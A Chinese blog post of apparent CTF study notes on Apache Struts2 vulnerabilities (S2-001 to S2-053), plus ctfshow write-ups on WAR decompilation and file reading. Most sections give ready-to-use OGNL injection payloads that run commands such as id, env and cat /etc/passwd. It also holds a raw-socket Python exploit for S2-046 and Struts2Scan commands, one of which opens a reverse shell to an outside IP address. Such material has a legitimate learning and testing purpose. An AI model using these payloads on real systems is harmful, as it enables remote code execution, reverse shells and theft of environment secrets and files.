---
title: struts2框架漏洞
date: 2023-08-12 20:47:18
categories:
- 网络安全
tags:
- web 
- java
description: |
    java框架漏洞
---

### 工具利用

`python Struts2Scan.py -u url` 检测
`python Struts2Scan.py -u url -n S2-001 --exec` 利用
`python3 Struts2Scan.py -u url -n S2-048 -d "name={exp}&age=11111&description=aaaa"  -lr 1.14.127.40:9999` 弹shell

### 判断是否基于struts2

通过网页后缀来判断，如`.do .action`，有可能不准
如果配置文件中常数`extension`的值以逗号结尾或者有空值，指明了`action`可以不带后缀，那么不带后缀的`uri`也可能是`struts2`框架搭建的
如果使用`Struts2`的`rest`插件，其默认的`struts-plugin.xml`指定的请求后缀为`xhtml,xml`和`json`
判断` /struts/webconsole.html `是否存在来进行判断，需要 `devMode` 为 `true`

#### S2-001

S2-001是当用户提交表单数据且验证失败时，服务器使用OGNL表达式解析用户先前提交的参数值，`%{value}`并重新填充相应的表单数据。例如，在注册或登录页面中。如果提交失败，则服务器通常默认情况下将返回先前提交的数据。由于服务器用于`%{value}`对提交的数据执行`OGNL`表达式解析，因此服务器可以直接发送有效载荷来执行命令。

了解下OGNL表达式中三个符号 %，#，$ 的含义

> - `%`的用途是在标志的属性为字符串类型时，计算OGNL表达式%{}中的值
> - `#`的用途访主要是访问非根对象属性，因为Struts 2中值栈被视为根对象，所以访问其他非根对象时，需要加#前缀才可以调用
> - `$`主要是在Struts 2配置文件中，引用OGNL表达式

```java
// 获取tomcat路径
%{"tomcatBinDir{"+@java.lang.System@getProperty("user.dir")+"}"}

// 获取web路径
%{#req=@org.apache.struts2.ServletActionContext@getRequest(),#response=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse").getWriter(),#response.println(#req.getRealPath('/')),#response.flush(),#response.close()}

// 命令执行 env，flag就在其中
password=%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{"env"})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}&username=1
```

#### S2-003

Struts2将HTTP的每个参数名解析为ognl语句执行,而ognl表达式是通过#来访问struts的对象，Struts2框架虽然过滤了#来进行过滤，但是可以通过unicode编码（u0023）或8进制（43）绕过了安全限制，达到代码执行的效果

影响版本：Struts 2.0.0 - Struts 2.0.11.2

#### S2-005

S2-005和S2-003的原理是类似的，因为官方在修补S2-003不全面，导致用户可以绕过官方的安全配置（禁止静态方法调用和类方法执行），再次造成的漏洞，可以说是升级版的S2-005是升级版的S2-003

影响版本：Struts 2.0.0 - Struts 2.1.8.1

```java
?('\u0023context[\'xwork.MethodAccessor.denyMethodExecution\']\u003dfalse')(bla)(bla)&('\u0023_memberAccess.excludeProperties\u003d@java.util.Collections@EMPTY_SET')(kxlzx)(kxlzx)&('\u0023mycmd\u003d\'ifconfig\'')(bla)(bla)&('\u0023myret\u003d@java.lang.Runtime@getRuntime().exec(\u0023mycmd)')(bla)(bla)&(A)(('\u0023mydat\u003dnew\40java.io.DataInputStream(\u0023myret.getInputStream())')(bla))&(B)(('\u0023myres\u003dnew\40byte[51020]')(bla))&(C)(('\u0023mydat.readFully(\u0023myres)')(bla))&(D)(('\u0023mystr\u003dnew\40java.lang.String(\u0023myres)')(bla))&('\u0023myout\u003d@org.apache.struts2.ServletActionContext@getResponse()')(bla)(bla)&(E)(('\u0023myout.getWriter().println(\u0023mystr)')(bla))
```

#### S2-007

当配置了验证规则` <ActionName>-validation.xml `时，若类型验证转换出错，后端默认会将用户提交的表单值通过字符串拼接，然后执行一次 OGNL 表达式解析并返回

影响版本：Struts2 2.0.0 - Struts2 2.2.3

```java
' + (#_memberAccess["allowStaticMethodAccess"]=true,#foo=new java.lang.Boolean("false") ,#context["xwork.MethodAccessor.denyMethodExecution"]=#foo,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('cat /proc/self/environ').getInputStream())) + '
```

#### S2-008

S2-008 涉及多个漏洞，Cookie 拦截器错误配置可造成 OGNL 表达式执行，但是由于大多 Web 容器（如 Tomcat）对 Cookie 名称都有字符限制，一些关键字符无法使用使得这个点显得比较鸡肋。另一个比较鸡肋的点就是在` struts2 `应用开启 `devMode` 模式后会有多个调试接口能够直接查看对象信息或直接执行命令，正如 `kxlzx` 所提这种情况在生产环境中几乎不可能存在，因此就变得很鸡肋的，但我认为也不是绝对的，万一被黑了专门丢了一个开启了` debug `模式的应用到服务器上作为后门也是有可能的。

- 虽然在struts2没有对恶意代码进行限制，但是java的webserver（Tomcat），对cookie的名称有较多限制，在传入struts2之前就被处理，从而较为鸡肋

```java
Cookie:('#_memberAccess.setAllowStaticMethodAccess(true)')(1)(2)=Aluvion; ('@java.lang.Runtime@getRuntime().exec("calc")')(1)(2)=Twings;
```

- 通过` devMode `模式下的调试接口，可以直接执行命令

开启了调试模式，但是调试模式中存在 OGNL 表达式注入漏洞

```java
devmode.action?debug=command&expression=(%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23foo%3Dnew%20java.lang.Boolean%28%22false%22%29%20%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%23foo%2C@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27env%27%29.getInputStream%28%29%29)
```

#### S2-009

Struts2 showcase远程代码执行漏洞

漏洞原理

> 这个漏洞再次来源于s2-003、s2-005
> 参考[Struts2漏洞分析之Ognl表达式特性引发的新思路](https://www.t00ls.net/viewthread.php?tid=21197)，文中说到，该引入ognl的方法不光可能出现在这个漏洞中，也可能出现在其他java应用中
>
> Struts2对s2-003的修复方法是禁止静态方法调用，在s2-005中可直接通过OGNL绕过该限制，对于`#`号，同样使用编码`\u0023`或`\43`进行绕过；于是Struts2对s2-005的修复方法是禁止`\`等特殊符号，使用户不能提交反斜线
>
> 但是，如果当前action中接受了某个参数`example`，这个参数将进入OGNL的上下文。所以，我们可以将OGNL表达式放在`example`参数中，然后使用`/helloword.acton?example=<OGNL statement>&(example)('xxx')=1`的方法来执行它，从而绕过官方对`#`、`\`等特殊字符的防御
>
> _通过Struts2框架中ParametersInterceptor拦截器只检查传入的参数名而不检查参数值的方式进行构造OGNL表达式从而造成代码执行_
>
> **影响版本**：Struts 2.0.0 - Struts 2.3.1

#### s2-012

> 如果在配置 Action 中 Result 时使用了重定向类型，并且还使用 ${param\_name} 作为重定向变量，例如：
>
> ```xml
> <package name="S2-012" extends="struts-default">
>     <action name="user" class="com.demo.action.UserAction">
>         <result name="redirect" type="redirect">/index.jsp?name=${name}</result>
>         <result name="input">/index.jsp</result>
>         <result name="success">/index.jsp</result>
>     </action>
> </package>
> ```
>
> 这里 UserAction 中定义有一个 name 变量，当触发 redirect 类型返回时，Struts2 获取使用 ${name} 获取其值，在这个过程中会对 name 参数的值执行 OGNL 表达式解析，从而可以插入任意 OGNL 表达式导致命令执行
>
> **影响版本**: 2.1.0 - 2.3.13

poc

```java
%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{"cat", "/etc/passwd"})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}
```

#### S2-013

> Struts2 标签中 `<s:a>` 和 `<s:url>` 都包含一个 includeParams 属性，其值可设置为 none，get 或 all，参考官方其对应意义如下：
>
> 1. none - 链接不包含请求的任意参数值（默认）
> 2. get - 链接只包含 GET 请求中的参数和其值
> 3. all - 链接包含 GET 和 POST 所有参数和其值
>
> `<s:a>`用来显示一个超链接，当`includeParams=all`的时候，会将本次请求的GET和POST参数都放在URL的GET参数上。在放置参数的过程中会将参数进行OGNL渲染，造成任意命令执行漏洞
>
> **影响版本**：2.0.0 - 2.3.14.1

poc

```java
${(#_memberAccess["allowStaticMethodAccess"]=true,#a=@java.lang.Runtime@getRuntime().exec('id').getInputStream(),#b=new java.io.InputStreamReader(#a),#c=new java.io.BufferedReader(#b),#d=new char[50000],#c.read(#d),#out=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#out.println(#d),#out.close())}

// 或

${#_memberAccess["allowStaticMethodAccess"]=true,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('id').getInputStream())}
```

访问

```java
/link.action?a=%24%7B%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23a%3D%40java.lang.Runtime%40getRuntime().exec('id').getInputStream()%2C%23b%3Dnew%20java.io.InputStreamReader(%23a)%2C%23c%3Dnew%20java.io.BufferedReader(%23b)%2C%23d%3Dnew%20char%5B50000%5D%2C%23c.read(%23d)%2C%23out%3D%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2C%23out.println('dbapp%3D'%2Bnew%20java.lang.String(%23d))%2C%23out.close()%7D
```

可以执行执行命令

S2-014 是对 S2-013 修复的加强，在 S2-013 修复的代码中忽略了 ${ognl\_exp} OGNL 表达式执行的方式，因此 S2-014 是对其的补丁加强

poc

`http://localhost:8080/S2-013/link.action?xxxx=%24%7B%28%23context%5B%27xwork.MethodAccessor.denyMethodExecution%27%5D%3Dfalse%29%28%23_memberAccess%5B%27allowStaticMethodAccess%27%5D%3Dtrue%29%28@java.lang.Runtime@getRuntime%28%29.exec%28%22open%20%2fApplications%2fCalculator.app%22%29%29%7D`

#### S2-015

> 漏洞产生于配置了 Action 通配符 \*，并将其作为动态值时，解析时会将其内容执行 OGNL 表达式，例如：
>
> ```xml
> <package name="S2-015" extends="struts-default">
>     <action name="*" class="com.demo.action.PageAction">
>         <result>/{1}.jsp</result>
>     </action>
> </package>
> ```
>
> 上述配置能让我们访问 name.action 时使用 name.jsp 来渲染页面，但是在提取 name 并解析时，对其执行了 OGNL 表达式解析，所以导致命令执行。在实践复现的时候发现，由于 name 值的位置比较特殊，一些特殊的字符如 / " \\ 都无法使用（转义也不行），所以在利用该点进行远程命令执行时一些带有路径的命令可能无法执行成功
>
> 还有需要说明的就是在 Struts 2.3.14.1 - Struts 2.3.14.2 的更新内容中，删除了 SecurityMemberAccess 类中的 setAllowStaticMethodAccess 方法，因此在 2.3.14.2 版本以后都不能直接通过 `#_memberAccess['allowStaticMethodAccess']=true` 来修改其值达到重获静态方法调用的能力
>
> **影响版本**: 2.0.0 - 2.3.14.2

poc

```java
${#context['xwork.MethodAccessor.denyMethodExecution']=false,#m=#_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess'),#m.setAccessible(true),#m.set(#_memberAccess,true),#q=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('id').getInputStream()),#q}.action
```

url编码发送

```url
%24%7b%23%63%6f%6e%74%65%78%74%5b%27%78%77%6f%72%6b%2e%4d%65%74%68%6f%64%41%63%63%65%73%73%6f%72%2e%64%65%6e%79%4d%65%74%68%6f%64%45%78%65%63%75%74%69%6f%6e%27%5d%3d%66%61%6c%73%65%2c%23%6d%3d%23%5f%6d%65%6d%62%65%72%41%63%63%65%73%73%2e%67%65%74%43%6c%61%73%73%28%29%2e%67%65%74%44%65%63%6c%61%72%65%64%46%69%65%6c%64%28%27%61%6c%6c%6f%77%53%74%61%74%69%63%4d%65%74%68%6f%64%41%63%63%65%73%73%27%29%2c%23%6d%2e%73%65%74%41%63%63%65%73%73%69%62%6c%65%28%74%72%75%65%29%2c%23%6d%2e%73%65%74%28%23%5f%6d%65%6d%62%65%72%41%63%63%65%73%73%2c%74%72%75%65%29%2c%23%71%3d%40%6f%72%67%2e%61%70%61%63%68%65%2e%63%6f%6d%6d%6f%6e%73%2e%69%6f%2e%49%4f%55%74%69%6c%73%40%74%6f%53%74%72%69%6e%67%28%40%6a%61%76%61%2e%6c%61%6e%67%2e%52%75%6e%74%69%6d%65%40%67%65%74%52%75%6e%74%69%6d%65%28%29%2e%65%78%65%63%28%27%69%64%27%29%2e%67%65%74%49%6e%70%75%74%53%74%72%65%61%6d%28%29%29%2c%23%71%7d%2e%61%63%74%69%6f%6e
```

#### S2-016

> 在struts2中，DefaultActionMapper类支持以"action:"、"redirect:"、"redirectAction:"作为导航或是重定向前缀，但是这些前缀后面同时可以跟OGNL表达式，由于struts2没有对这些前缀做过滤，导致利用OGNL表达式调用java静态方法执行任意系统命令
>
> 所以，访问`http://your-ip:8080/index.action?redirect:OGNL表达式`即可执行OGNL表达式
>
> **影响版本:** 2.0.0 - 2.3.15

poc

执行命令

```java
redirect:${#context["xwork.MethodAccessor.denyMethodExecution"]=false,#f=#_memberAccess.getClass().getDeclaredField("allowStaticMethodAccess"),#f.setAccessible(true),#f.set(#_memberAccess,true),#a=@java.lang.Runtime@getRuntime().exec("uname -a").getInputStream(),#b=new java.io.InputStreamReader(#a),#c=new java.io.BufferedReader(#b),#d=new char[5000],#c.read(#d),#genxor=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse").getWriter(),#genxor.println(#d),#genxor.flush(),#genxor.close()}
```

需要将冒号后边的内容url编码，去除特殊字符，执行命令后下载文件

#### S2-019

> 动态方法调用的默认启用，原理类似于s2-008
>
> Apache Struts 2的“Dynamic Method Invocation”机制是默认开启的，仅提醒用户如果可能的情况下关闭此机制，这样就存在远程代码执行漏洞，远程攻击者可利用此漏洞在受影响应用上下文中执行任意代码

poc

```java
?debug=command&expression=#a=(new java.lang.ProcessBuilder('id')).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#out=#context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),#out.getWriter().println(new java.lang.String(#e)),#out.getWriter().flush(),#out.getWriter().close()
// 利用是先进行url编码    
```

> 与s2-008poc区别不同的仅仅是由原先的\["allowStaticMethodAccess"\]=true静态方法执行改为(new java.lang.ProcessBuilder('id')).start()，但该方法在虚空浪子心提出s2-012后不久就在博客里说明了官方修补方案将allowStaticMethodAccess取消了后的替补方法就是使用ava.lang.ProcessBuilder
>
> **影响版本**：Struts 2.0.0 - Struts 2.3.15.1

#### S2-029

> Struts框架被强制执行时，对分配给某些标签的属性值进行双重评估，因此可以传入一个值，当一个标签的属性将被渲染时，该值将被再次评估
>
> 例如：代码执行过程大致为先尝试获取value的值，如果value为空，那么就二次解释执行了name。并且在执行前给name加上了”%{}”。最终造成二次执行
>
> **影响版本**：Struts 2.0.0 - Struts 2.3.24.1（2.3.20.3除外）

poc

```java
default.action?message=(%23_memberAccess['allowPrivateAccess']=true,%23_memberAccess['allowProtectedAccess']=true,%23_memberAccess['excludedPackageNamePatterns']=%23_memberAccess['acceptProperties'],%23_memberAccess['excludedClasses']=%23_memberAccess['acceptProperties'],%23_memberAccess['allowPackageProtectedAccess']=true,%23_memberAccess['allowStaticMethodAccess']=true,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('id').getInputStream()))
```

#### S2-032

> Struts2在开启了动态方法调用（Dynamic Method Invocation）的情况下，可以使用`method:<name>`的方式来调用名字是`<name>`的方法，而这个方法名将会进行OGNL表达式计算，导致远程命令执行漏洞
>
> **影响版本**: Struts 2.3.20 - Struts Struts 2.3.28 (except 2.3.20.3 and 2.3.24.3)

poc

```java
?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding%5B0%5D),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd%5B0%5D).getInputStream()).useDelimiter(%23parameters.pp%5B0%5D),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp%5B0%5D,%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&pp=%5C%5CA&ppp=%20&encoding=UTF-8&cmd=id
```

![image-20211001220426810](https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/48a1e291f7e74804bf4445b064f36d89~tplv-k3u1fbpfcp-zoom-in-crop-mark:4536:0:0:0.awebp)

#### S2-033

> 当开启动态方法调用，并且同时使用了Strut2 REST Plugin插件时，使用“!”操作符调用动态方法可能执行ognl表达式，导致代码执行
>
> **影响版本**：Struts 2.3.20 – Struts 2.3.28 (不包括 2.3.20.3和 2.3.24.3)

```java
/orders/4/%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23xx%3d123,%23rs%3d@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command[0]).getInputStream()),%23wr%3d%23context[%23parameters.obj[0]].getWriter(),%23wr.print(%23rs),%23wr.close(),%23xx.toString.json?&obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=2908&command=id
```

#### S2-037

> 当使用REST插件启用动态方法调用时，可以传递可用于在服务器端执行任意代码的恶意表达式
>
> **影响版本**：Struts 2.3.20 - Struts Struts 2.3.28（2.3.20.3和2.3.24.3除外）

poc

```java
/orders/3/%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23xx%3d123,%23rs%3d@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command[0]).getInputStream()),%23wr%3d%23context[%23parameters.obj[0]].getWriter(),%23wr.print(%23rs),%23wr.close(),%23xx.toString.json?&obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=2908&command=whoami
```

#### S2-045

> 在使用基于Jakarta插件的文件上传功能时，有可能存在远程命令执行，导致系统被黑客入侵 恶意用户可在上传文件时通过修改HTTP请求头中的Content-Type值来触发该漏洞，进而执行系统命令
>
> **影响版本**：Struts 2.3.5 – Struts 2.3.31 Struts 2.5 – Struts 2.5.10

```java
Content-Type: "%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='whoami').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}" boundary=----WebKitFormBoundaryXx80aU0pu6vrsV3z
```

#### S2-046

> 与s2-045类似，但是输入点在文件上传的filename值位置，并需要使用`\x00`截断
>
> **影响版本**：Struts 2.3.5 - Struts 2.3.31, Struts 2.5 - Struts 2.5.10

由于需要发送畸形数据包，简单使用原生socket编写payload

```py
import socket

q = b'''------WebKitFormBoundaryXd004BVJN9pBYBL2
Content-Disposition: form-data; name="upload"; filename="%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-Test',233*233)}\x00b"
Content-Type: text/plain

foo
------WebKitFormBoundaryXd004BVJN9pBYBL2--'''.replace(b'\n', b'\r\n')
p = b'''POST / HTTP/1.1
Host: localhost:8080
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.8,es;q=0.6
Connection: close
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryXd004BVJN9pBYBL2
Content-Length: %d

'''.replace(b'\n', b'\r\n') % (len(q), )

with socket.create_connection(('your-ip', '8080'), timeout=5) as conn:
    conn.send(p + q)
    print(conn.recv(10240).decode())
```

#### S2-048

漏洞原理

> 漏洞主要问题出在struts2-struts1-plugin这个插件包上。这个库的主要作用就是将struts1的action封装成struts2的action以便它能在strut2上运行使用 而由于struts2-struts1-plugin 包中的 “Struts1Action.java” 中的 execute 函数可以调用 getText() 函数，这个函数刚好又能执行OGNL表达式，同时这个 getText() 的 参数输入点，又可以被用户直接进行控制，如果这个点被恶意攻击者所控制，就可以构造恶意执行代码，从而实现一个RCE攻击
>
> **影响版本**: 2.0.0 - 2.3.32

工具解`python3 Struts2Scan.py -u http://a6f75f2d-962c-4e6e-bee6-06b301aa3f35.challenge.ctf.show/S2-048/integration/saveGangster.action -n S2-048 -d "name={exp}&age=11111&description=aaaa"  -lr 1.14.127.40:9999`

点击struts 1 lntegration

![image-20211001224409232](https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/735014b922a0440d8e45bbd3a971eee2~tplv-k3u1fbpfcp-zoom-in-crop-mark:4536:0:0:0.awebp)

以第一个参数为攻击点，在其执行OGNL语法，${10-7}，点击submit

![image-20211001224508795](https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/3a5cc75160044033b414eb5606ab8e47~tplv-k3u1fbpfcp-zoom-in-crop-mark:4536:0:0:0.awebp)

![image-20211001224600729](https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/bda07dae555d4dca860aa9bbaf2419ce~tplv-k3u1fbpfcp-zoom-in-crop-mark:4536:0:0:0.awebp)

借用S2-045的沙盒绕过方法，改了一个POC。将如下POC填入表单`Gengster Name`中，提交即可直接回显命令执行的结果

```java
%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#q=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('id').getInputStream())).(#q)}
```

![image-20211001224916569](https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/03cbce5fb07a45eaaaafe08d0d737058~tplv-k3u1fbpfcp-zoom-in-crop-mark:4536:0:0:0.awebp)

也可以使用s2-045poc，抓包修改content-type

```java
%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}
```

#### S2-052

> Struts2-Rest-Plugin是让Struts2能够实现Restful API的一个插件，其根据Content-Type或URI扩展名来判断用户传入的数据包类型，有如下映射表：
>
> | 扩展名 | Content-Type | 解析方法 |
> | --- | --- | --- |
> | xml | application/xml | xstream |
> | json | application/json | jsonlib或jackson(可选) |
> | xhtml | application/xhtml+xml | 无 |
> | 无 | application/x-www-form-urlencoded | 无 |
> | 无 | multipart/form-data | 无 |
>
> jsonlib无法引入任意对象，而xstream在默认情况下是可以引入任意对象的（针对1.5.x以前的版本），方法就是直接通过xml的tag name指定需要实例化的类名：
>
> ```xml
> <classname></classname>
> //或者
> <paramname class="classname"></paramname>
> ```
>
> 所以，我们可以通过反序列化引入任意类造成远程命令执行漏洞，只需要找到一个在Struts2库中适用的gedget
>
> **影响版本**：Struts 2.1.2 - Struts 2.3.33, Struts 2.5 - Struts 2.5.12

[github.com/vulhub/vulh…](https://link.juejin.cn/?target=https%3A%2F%2Fgithub.com%2Fvulhub%2Fvulhub%2Fblob%2Fmaster%2Fstruts2%2Fs2-052%2FREADME.zh-cn.md "https://github.com/vulhub/vulhub/blob/master/struts2/s2-052/README.zh-cn.md")

#### S2-053

> Struts2在使用Freemarker模板引擎的时候，同时允许解析OGNL表达式。导致用户输入的数据本身不会被OGNL解析，但由于被Freemarker解析一次后变成离开一个表达式，被OGNL解析第二次，导致任意命令执行漏洞

poc

```java
%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))}
```

![image-20211002101331400](https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/47b6ccca198e4e43aaf4ffa677ef220b~tplv-k3u1fbpfcp-zoom-in-crop-mark:4536:0:0:0.awebp)

#### 反编译

提示：看看代码，了解下和php不一样的地方

题目附件一个war包

> jar包和war包都可以看成压缩文件，都可以用解压软件打开，jar包和war包都是为了项目的部署和发布，通常在打包部署的时候，会在里面加上部署的相关信息。这个打包实际上就是把代码和依赖的东西压缩在一起，变成后缀名为.jar和.war的文件，就是我们说的jar包和war包。但是这个“压缩包”可以被编译器直接使用，把war包放在tomcat目录的webapp下，tomcat服务器在启动的时候可以直接使用这个war包。通常tomcat的做法是解压，编译里面的代码，所以当文件很多的时候，tomcat的启动会很慢。
>
> jar包和war包的区别：jar包是java打的包，war包可以理解为javaweb打的包，这样会比较好记。jar包中只是用java来写的项目打包来的，里面只有编译后的class和一些部署文件。而war包里面的东西就全了，包括写的代码编译成的class文件，依赖的包，配置文件，所有的网站页面，包括html，jsp等等。一个war包可以理解为是一个web项目，里面是项目的所有东西。

使用工具[Java decompiler](https://link.juejin.cn/?target=https%3A%2F%2Fgithub.com%2Fjava-decompiler%2Fjd-gui%2Freleases "https://github.com/java-decompiler/jd-gui/releases")反编译class文件

在loginServlet.class文件中存在输出flag

![image-20211002102926161](https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/5f3707b0b6d9461d8a63a4a53bae544e~tplv-k3u1fbpfcp-zoom-in-crop-mark:4536:0:0:0.awebp)

查看getVipStatus函数

![image-20211002103004671](https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/c17f8bc2ffb747fbad1f31bccc87f49c~tplv-k3u1fbpfcp-zoom-in-crop-mark:4536:0:0:0.awebp)

payload

```url
/ctfshow/login?username=admin&password=ctfshow
```

![image-20211002103041836](https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/b4aa90fd1fd7423aa1414ce32c218b98~tplv-k3u1fbpfcp-zoom-in-crop-mark:4536:0:0:0.awebp)

#### 文件读取

查看源代码，发现文件指针

![image-20211002103816468](https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/acdc8e26c83a42b5b17227667eb90f40~tplv-k3u1fbpfcp-zoom-in-crop-mark:4536:0:0:0.awebp)

并且可以读取文件

![image-20211002103855249](https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/c1c61cf86fdb444d831d40c7783658c8~tplv-k3u1fbpfcp-zoom-in-crop-mark:4536:0:0:0.awebp)

去读WEB-INF/web.xml，发现存在con.ctfshow.servlet.GetFlag

![image-20211002104003042](https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/2f6d0916950f4a83aa92a84505e412e1~tplv-k3u1fbpfcp-zoom-in-crop-mark:4536:0:0:0.awebp)

读取WEB-INF/classes/com/ctfshow/servlet/GetFlag.class，因为是class文件字符有点乱，发现fl3g

![image-20211002104336418](https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/227e706a13d5497bb1b53c41a877c822~tplv-k3u1fbpfcp-zoom-in-crop-mark:4536:0:0:0.awebp)

![image-20211002104428105](https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/c6303cad7e5d4f3ebc63b8ea10882a9b~tplv-k3u1fbpfcp-zoom-in-crop-mark:4536:0:0:0.awebp)

#### 文件读取2

和上题一样 找到的flag叫f1bg

补充：以上题目中缺少三个struts2漏洞

![image-20211002104709960](https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/840d43372099411c90c33f7f024d9e18~tplv-k3u1fbpfcp-zoom-in-crop-mark:4536:0:0:0.awebp)
